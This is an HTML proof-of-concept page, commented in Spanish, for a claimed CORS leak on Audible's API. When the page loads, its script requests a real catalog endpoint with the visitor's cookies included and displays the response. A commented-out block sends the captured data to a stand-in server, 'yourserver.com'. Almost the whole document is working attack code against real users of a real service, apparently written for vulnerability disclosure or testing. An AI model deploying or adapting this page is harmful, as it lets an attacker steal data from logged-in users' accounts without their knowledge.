<!DOCTYPE html>
<html>
<head>
  <title>PoC Audible CORS Leak</title>
</head>
<body>
  <h1>Testing CORS on Audible API</h1>
  <pre id="output">Loading...</pre>

  <script>
    fetch("https://api.audible.es/1.0/catalog/products", {
      method: "GET",
      credentials: "include", // ðŸ”¥ Usa cookies del usuario Audible
    })
    .then(response => response.json())
    .then(data => {
      // Muestra el contenido filtrado
      document.getElementById("output").innerText = JSON.stringify(data, null, 2);

      // ðŸ”¥ Opcional: exfiltra a tu servidor
      /*
      fetch("https://yourserver.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
      */
    })
    .catch(err => {
      document.getElementById("output").innerText = "Error: " + err;
    });
  </script>
</body>
</html>
